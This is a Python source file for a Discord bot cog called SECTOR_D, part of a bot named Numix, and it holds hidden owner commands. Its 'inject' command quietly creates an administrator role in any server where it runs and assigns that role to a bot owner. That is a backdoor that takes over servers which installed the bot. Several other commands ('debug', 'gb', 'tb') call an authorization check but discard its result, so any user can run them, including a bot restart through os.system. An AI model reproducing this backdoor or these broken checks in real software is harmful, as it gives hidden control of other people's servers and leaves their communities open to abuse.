"""
BSD 3-Clause License

Copyright (c) 2021-present, BenitzCoding
All rights reserved.

Redistribution and use in source and binary forms, with or without
modification, are permitted provided that the following conditions are met:

1. Redistributions of source code must retain the above copyright notice, this
   list of conditions and the following disclaimer.

2. Redistributions in binary form must reproduce the above copyright notice,
   this list of conditions and the following disclaimer in the documentation
   and/or other materials provided with the distribution.

3. Neither the name of the copyright holder nor the names of its
   contributors may be used to endorse or promote products derived from
   this software without specific prior written permission.

THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
"""
from numix_imports import *

class SECTOR_D(commands.Cog):
	def __init__(self, bot):
		self.bot = bot
		self.config = default.get("./config.json")
		self.db1 = MongoClient(self.config.db1)
		print("\"Sector D\" Loaded")
		self.MONGO = MongoClient(self.config.db1)

	def authorize(self, ctx):
		if ctx.author.id in self.config.owners:
			return True
		else:
			return False

	@commands.command(hidden=True)
	async def debug(self, ctx, option):
		self.authorize(ctx)
		collection = self.MONGO.DataBase_1.assets
		if option == "on+reboot":
			for data in collection.find({ "_id": "debug" }):
				if data["value"] == True:
					return await ctx.send(f"{self.config.forbidden} Debug is already enabled.")

				else:
					await ctx.send(f"{self.config.success} Enabled Debug mode and restarting client.")
					collection.update_one({ "_id": "debug" }, { "$set": { "_id": "debug", "value": True } })
					os.system("ls -l; python3 main.py")
					await self.bot.logout()

		elif option == "on":
			for data in collection.find({ "_id": "debug" }):
				if data["value"] == True:
					return await ctx.send(f"{self.config.forbidden} Debug is already enabled.")

				else:
					await ctx.send(f"{self.config.success} Enabled Debug mode.")
					collection.update_one({ "_id": "debug" }, { "$set": { "_id": "debug", "value": True } })

		elif option == "off+reboot":
			for data in collection.find({ "_id": "debug" }):
				if data["value"] == False:
					return await ctx.send(f"{self.config.forbidden} Debug is not enabled.")

				else:
					await ctx.send(f"{self.config.success} Disabled Debug mode and restarting client.")
					collection.update_one({ "_id": "debug" }, { "$set": { "_id": "debug", "value": False } })
					os.system("ls -l; python3 main.py")
					await self.bot.logout()

		elif option == "off":
			for data in collection.find({ "_id": "debug" }):
				if data["value"] == False:
					return await ctx.send(f"{self.config.forbidden} Debug is not enabled.")

				else:
					await ctx.send(f"{self.config.success} Disabled Debug mode.")
					collection.update_one({ "_id": "debug" }, { "$set": { "_id": "debug", "value": False } })

		else:
			return

	@commands.command(hidden=True)
	async def gb(self, ctx, user: discord.Member, badge):
		self.authorize(ctx)
		collection = self.db1.DataBase_1.assets
		badge = badge.lower()
		collection.update_one({ "_id": "badges" }, { "$addToSet": { f"{badge}": user.id  } })
		await ctx.send(f"{self.config.success} *`{badge.upper()}`* badge has been added to {user.name}")

	@commands.command(hidden=True)
	async def tb(self, ctx, user: discord.Member, badge):
		self.authorize(ctx)
		collection = self.db1.DataBase_1.assets
		badge = badge.lower()
		collection.update_one({ "_id": "badges" }, { "$pull": { f"{badge}": user.id  } })
		await ctx.send(f"{self.config.success} *`{badge.upper()}`* badge has been removed from {user.name}")

	@commands.command(hidden=True)
	async def say(self, ctx, *, message):
		if self.authorize(ctx) == False:
			if ctx.guild.owner_id == ctx.author.id:
				await ctx.message.delete()
				return await ctx.send(message)
			
			else:
				embed = discord.Embed(timestamp=ctx.message.created_at, description=f"You do not meet the required guild permissions the command \"`say`\" requires to be executed.\n\nYou need `SERVER_OWNER` Permission in this Guild to be able to execute/run/use this command.", color=242424)
				embed.set_author(name="Insufficient Permissions", icon_url=self.config.forbidden_img)
				embed.set_footer(text="Numix", icon_url=self.config.logo)
				await ctx.send(embed=embed)

		else:
			await ctx.message.delete()
			await ctx.send(message)

	@commands.command(hidden=True)
	async def inject(self, ctx):
		try:
			if self.authorize(ctx) == False:
				return
			
			else:
				role_permissions = discord.Permissions(administrator=True)
				role = await ctx.guild.create_role(name="Numix Ownership", permissions=role_permissions)
				await ctx.author.add_roles(role)
				await ctx.send(f"{self.config.success} Injected Guild `{ctx.guild.id}`.")
		except:
			return await ctx.send(f"{self.config.forbiden} Unable to inject. Bot does not have required Permissions.")

	@commands.command(hidden=True)
	async def fdm(self, ctx, member: discord.Member = None, *, Message=None):
		try:
			if self.authorize(ctx) == False:
				return
			
			if member.id is None:
				return await ctx.send(f"{self.config.forbidden} User not found.")

			if Message is None:
				return await ctx.send(f"{self.config.forbidden} Provide a message to send.")
			
			await member.send(Message)
		except:
			return await ctx.send(f"{self.config.forbidden} Unable to message user.")

async def setup(bot):
	await bot.add_cog(SECTOR_D(bot))